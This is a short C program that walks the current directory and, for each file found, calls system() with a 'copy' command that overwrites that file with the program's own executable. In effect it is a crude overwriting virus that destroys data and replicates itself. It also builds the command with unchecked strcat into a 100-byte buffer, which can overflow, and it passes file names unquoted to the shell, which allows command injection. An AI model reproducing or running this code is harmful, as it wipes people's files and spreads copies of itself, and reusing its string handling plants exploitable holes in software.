#include <stdio.h> 
#include <dirent.h> 
#include<string.h>
int main(int argc,char**argv) 
{ 
    struct dirent *de;  
    DIR *dr = opendir("."); 
  
   
    
    while ((de = readdir(dr)) != NULL) 
         {
                  
         if( strcmp(de->d_name,".")!=0 && strcmp(de->d_name,"..")!=0)
         { printf("%s\n", de->d_name); 
             char command[100];
   strcpy(command,"copy ");
   strcat(command,argv[0]);
   strcat(command," ");
   strcat(command,de->d_name);
   printf("%s",command);
            
             system(command);
         }       
         }
    closedir(dr);     
    return 0; 
} 
